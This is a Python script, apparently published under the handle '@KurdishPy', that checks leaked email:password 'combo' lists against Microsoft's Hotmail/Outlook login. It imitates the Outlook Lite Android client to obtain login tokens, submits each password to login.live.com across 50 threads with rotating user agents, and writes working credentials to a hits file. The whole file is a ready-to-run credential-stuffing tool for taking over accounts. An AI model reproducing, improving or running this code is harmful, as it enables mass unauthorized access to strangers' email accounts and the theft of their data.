
#!/usr/bin/env python3
import sys
import os
import requests
import urllib.parse
import uuid
import concurrent.futures
import random
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# User agents list as fallback
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36'
]

def generate_user_agent():
    """Generate random user agent"""
    return random.choice(USER_AGENTS)

COMBO_FILE = input(f" -- @KurdishPy | Hotmail\n\n [×] COMBO: ")

# Global counters
Success = 0
BAD = 0
TOTAL = 0

# File to save hits
HITS_FILE = "Hotmail-Hits.txt"

def update_stats():
    """Update statistics in console"""
    sys.stdout.write(
        f"\r -- {Fore.GREEN}Hits{Fore.WHITE}: {Success} | {Fore.RED}Bad{Fore.WHITE}: {BAD} | {Fore.CYAN}Total{Fore.WHITE}: {TOTAL} | {Fore.YELLOW}Remaining{Fore.WHITE}: {TOTAL - (Success + BAD)}"
    )
    sys.stdout.flush()

def save_hit(email, password):
    """Save successful hit to file"""
    with open(HITS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")

def getTokens(email):
    """Get initial tokens for authentication"""
    for _ in range(4):
        try:
            headers = {
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": generate_user_agent(),
                "return-client-request-id": "false",
                "client-request-id": str(uuid.uuid4()),
                "x-ms-sso-ignore-sso": "1",
                "correlation-id": str(uuid.uuid4()),
                "x-client-ver": "1.1.0+9e54a0d1",
                "x-client-os": "28",
                "x-client-sku": "MSAL.xplat.android",
                "x-client-src-sku": "MSAL.xplat.android",
                "X-Requested-With": "com.microsoft.outlooklite",
            }

            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }

            url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            res = requests.get(url, headers=headers, timeout=12)
            text = res.text

            if '"urlPost":"' not in text:
                continue

            urlPost = text.split('"urlPost":"')[1].split('",')[0]
            PPFT = text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]

            cok = res.cookies.get_dict()
            return (
                urlPost, PPFT,
                res.url.split('haschrome=1')[0] if 'haschrome=1' in res.url else res.url,
                cok.get('MSPRequ', ''), cok.get('uaid', ''),
                cok.get('RefreshTokenSso', ''), cok.get('MSPOK', ''),
                cok.get('OParams', '')
            )
        except Exception as e:
            continue
    return None

def check_account(email, password):
    """Check single account"""
    global Success, BAD
    
    try:
        # Get initial tokens
        tokens = getTokens(email)
        if not tokens:
            BAD += 1
            update_stats()
            return
            
        host, h1, h2, h3, h4, h6, h7, h8 = tokens
        
        # Prepare payload for login
        payload = {
            "i13": "1", "login": email, "loginfmt": email, "type": "11",
            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "",
            "hisScaleUnit": "", "passwd": password, "ps": "2",
            "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
            "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": h1,
            "PPSX": "PassportR", "NewUser": "1", "FoundMSAs": "",
            "fspost": "0", "i21": "0", "CookieDisclosure": "0",
            "IsFidoSupported": "0", "isSignupPost": "0",
            "isRecoveryAttemptPost": "0", "i19": "9960"
        }

        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(payload)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": generate_user_agent(),
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{h2}haschrome=1" if h2 else "https://login.live.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={h3};uaid={h4};RefreshTokenSso={h6};MSPOK={h7};OParams={h8}"
        }

        r = requests.post(host, data=payload, headers=headers, allow_redirects=False, timeout=12)

        # Check for successful authentication
        if "JSH" in r.cookies and "JSHP" in r.cookies:
            Success += 1
            save_hit(email, password)
            sys.stdout.write(f"\r{Fore.GREEN}[+] HIT found! (Total: {Success})")
            sys.stdout.flush()
        else:
            BAD += 1
            
        update_stats()
        
    except Exception as e:
        BAD += 1
        update_stats()

def main():
    global TOTAL
    
    # Check if combo file exists
    if not os.path.exists(COMBO_FILE):
        print(f"{Fore.RED}[!] File not found: {COMBO_FILE}")
        return
    
    # Read combos
    with open(COMBO_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line]
    
    TOTAL = len(combos)
    
    if TOTAL == 0:
        print(f"{Fore.RED}[!] No valid combos found in file")
        return
    
    print(f"{Fore.CYAN}[*] Loaded {TOTAL} accounts")
    print(f"{Fore.CYAN}[*] Starting with 50 workers")
    print(f"{Fore.CYAN}[*] Hits will be saved to: {HITS_FILE}")
    print("-" * 50)
    
    # Clear hits file if exists
    if os.path.exists(HITS_FILE):
        open(HITS_FILE, 'w').close()
    
    # Process combos with thread pool
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        for combo in combos:
            if ':' not in combo:
                continue
                
            try:
                email, password = combo.split(':', 1)
                futures.append(
                    executor.submit(check_account, email.strip(), password.strip())
                )
            except:
                continue
        
        # Wait for all tasks to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                pass
    
    print(f"\n\n{Fore.GREEN}[+] Finished!")
    print(f"{Fore.GREEN}[+] Total Hits: {Success}")
    print(f"{Fore.RED}[+] Total Bad: {BAD}")
    print(f"{Fore.CYAN}[+] Hits saved to: {HITS_FILE}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")
        sys.exit(1)